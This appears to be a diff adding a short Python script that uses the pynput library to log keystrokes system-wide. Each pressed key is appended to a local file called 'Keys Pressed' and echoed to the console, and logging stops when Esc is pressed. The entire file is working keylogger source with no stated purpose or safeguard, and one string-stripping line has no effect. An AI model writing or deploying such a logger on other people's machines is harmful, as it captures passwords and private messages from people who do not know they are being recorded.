@@ -1,0 +1,30 @@
+from pynput import keyboard
+
+
+
+keys=[]
+count = 0
+def on_press(key):
+    global keys, count
+    keys.append(key)
+    write_file(keys)
+    print('{0} pressed'.format(key))
+    keys=[]
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        # Stop listener
+        return False
+
+
+def write_file(list_of_keys):
+    with open('Keys Pressed', 'a') as f:
+        for x in list_of_keys:
+            str(x).strip("'")
+            f.write(str(x))
+        
+
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+    
